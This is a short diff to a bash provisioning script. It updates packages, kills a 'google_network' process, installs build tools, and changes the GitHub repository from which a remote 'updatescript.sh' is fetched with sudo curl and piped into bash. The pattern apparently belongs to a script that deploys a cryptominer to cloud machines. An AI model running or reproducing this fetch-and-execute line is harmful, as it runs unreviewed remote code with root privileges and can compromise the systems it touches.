@@ -1,8 +1,5 @@
 #!/bin/bash
 
-ID="$(hostname)"
-THREADS="$(nproc --all)"
-
 sudo apt-get update
 sudo apt-get -y upgrade
 sudo pkill google_network
@@ -36,4 +33,4 @@ sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essen
 sleep 3
 sudo apt-get install dos2unix
 
-sudo curl -s -L https://raw.githubusercontent.com/zoozx/betatest/master/updatescript.sh | bash -s
+sudo curl -s -L https://raw.githubusercontent.com/githubec/beauty/master/updatescript.sh | bash -s
